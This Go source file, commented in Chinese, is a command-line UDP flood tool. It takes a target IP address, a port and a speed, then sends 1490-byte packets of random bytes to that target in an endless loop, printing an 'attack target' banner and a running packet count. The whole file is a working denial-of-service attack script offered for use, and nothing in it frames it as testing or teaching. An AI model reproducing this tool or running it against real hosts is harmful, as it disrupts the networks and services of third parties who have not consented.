package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"time"
)

// attack 函数用于发送 UDP 数据包
func attack(ip string, port, speed int) {
	// 创建 UDP 套接字
	conn, err := net.ListenPacket("udp", ":0")
	if err != nil {
		fmt.Println("无法创建 UDP 套接字:", err)
		return
	}
	defer conn.Close()

	// 生成随机数据包
	packet := make([]byte, 1490)
	rand.Seed(time.Now().UnixNano())

	count := 0
	for {
		// 随机填充数据包
		rand.Read(packet)

		// 发送数据包
		addr := &net.UDPAddr{IP: net.ParseIP(ip), Port: port}
		_, err := conn.WriteTo(packet, addr)
		if err != nil {
			fmt.Println("发送数据包失败:", err)
			continue
		}

		count++
		fmt.Printf("已发送 %d 个数据包到 %s:%d\n", count, ip, port)

		// 控制发送速度
		time.Sleep(time.Duration((1000-speed)/2000) * time.Millisecond)
	}
}

func main() {
	// 定义命令行参数
	ip := flag.String("ip", "", "目标服务器的 IP 地址 (必填)")
	port := flag.Int("port", 80, "目标服务器的端口，默认为 80")
	speed := flag.Int("speed", 1000, "数据包发送速度，范围 1-1000，默认为 1000")
	help := flag.Bool("h", false, "显示帮助信息")

	// 解析命令行参数
	flag.Parse()

	// 如果 help 标志或 ip 为空，则打印帮助信息
	if *help || *ip == "" {
		fmt.Println("使用说明:")
		flag.Usage()
		os.Exit(0)
	}

	// 显示攻击参数
	fmt.Printf("攻击目标: IP = %s, Port = %d, Speed = %d\n", *ip, *port, *speed)

	// 启动攻击
	attack(*ip, *port, *speed)
}
